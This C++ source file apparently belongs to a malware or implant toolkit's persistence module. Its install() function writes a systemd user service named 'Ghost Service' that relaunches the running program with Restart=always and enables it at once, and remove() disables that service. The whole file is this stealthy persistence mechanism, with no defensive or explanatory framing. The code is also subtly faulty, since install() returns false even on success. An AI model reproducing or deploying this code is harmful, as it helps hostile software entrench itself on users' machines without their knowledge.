#include "modules/persistence/Service.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"

bool ServiceMethod::install() {
    std::string serviceContent = "[Unit]\nDescription=Ghost Service\n\n[Service]\nExecStart=" + SystemUtils::GetProcessPath() + "\nRestart=always\n\n[Install]\nWantedBy=default.target";
    std::string path = SystemUtils::GetUserHome() + "/.config/systemd/user/" + SERVICE_NAME;

    FileUtils::WriteFile(path, serviceContent);
    
    if (!SystemUtils::ExecuteCommand("systemctl --user enable --now " + SERVICE_NAME)) {
        return false;
    }

    return false;
}

bool ServiceMethod::remove() {
    return SystemUtils::ExecuteCommand("systemctl --user disable " + SERVICE_NAME);
}
